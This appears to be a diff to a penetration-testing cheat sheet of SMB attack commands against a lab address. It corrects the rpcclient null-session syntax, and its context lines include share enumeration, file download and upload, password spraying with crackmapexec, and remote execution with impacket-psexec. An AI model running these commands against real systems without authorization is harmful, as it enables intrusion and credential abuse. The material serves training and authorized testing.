@@ -23,7 +23,7 @@ smbmap -H 10.10.10.1	| Network share enumeration using smbmap.
 smbmap -H 10.10.10.1 -r notes |	Recursive network share enumeration using smbmap.
 smbmap -H 10.10.10.1 --download "notes\note.txt"	| Download a specific file from the shared folder.
 smbmap -H 10.10.10.1 --upload test.txt "notes\test.txt"	| Upload a specific file to the shared folder.
-rpcclient -U'%' 10.10.10.1	| Null-session with the rpcclient.
+rpcclient -U '' -N 10.10.10.1	| Null-session with the rpcclient.
 ./enum4linux-ng.py 10.10.10.1 -A -C	| Automated enumeratition of the SMB service using enum4linux-ng.
 crackmapexec smb 10.10.10.1 -u /tmp/userlist.txt -p 'Company01!'	| Password spraying against different users from a list.
 impacket-psexec administrator:'Password123!'@10.10.10.1	| Connect to the SMB service using the impacket-psexec.
